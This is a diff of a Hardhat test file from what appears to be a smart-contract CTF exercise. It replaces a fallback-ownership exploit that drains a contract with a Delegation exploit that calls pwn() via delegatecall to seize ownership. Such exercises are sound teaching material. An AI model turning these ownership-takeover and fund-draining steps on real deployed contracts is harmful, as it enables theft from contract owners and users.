@@ -1,7 +1,7 @@
-const { ethers } = require('hardhat');
+const { ethers, web3 } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] Delegation', function () {
 
     let deployer, attacker;
     
@@ -13,30 +13,27 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
+            const ContractFactory = await ethers.getContractFactory('Delegation');
             this.target = ContractFactory.attach("");
             
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
-            this.target = await ContractFactory.deploy();
+            const DelegateFactory = await ethers.getContractFactory('Delegate', deployer);
+            this.delegate = await DelegateFactory.deploy(deployer.address);
+            const ContractFactory = await ethers.getContractFactory('Delegation', deployer);
+            this.target = await ContractFactory.deploy(this.delegate.address);
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        let abi = ["function pwn()"];
+        const contract = new ethers.Contract(this.target.address, abi, ethers.provider);
+        console.log(`\t owner before: ${await this.target.owner()}`);
+        let pwntx = await contract.connect(attacker).pwn({gasLimit:200000}); await pwntx.wait();
+        console.log(`\t owner after : ${await this.target.owner()}`);
+        console.log(`\t attacker    : ${attacker.address}`);
     }).timeout(0);
 
     after(async () => {
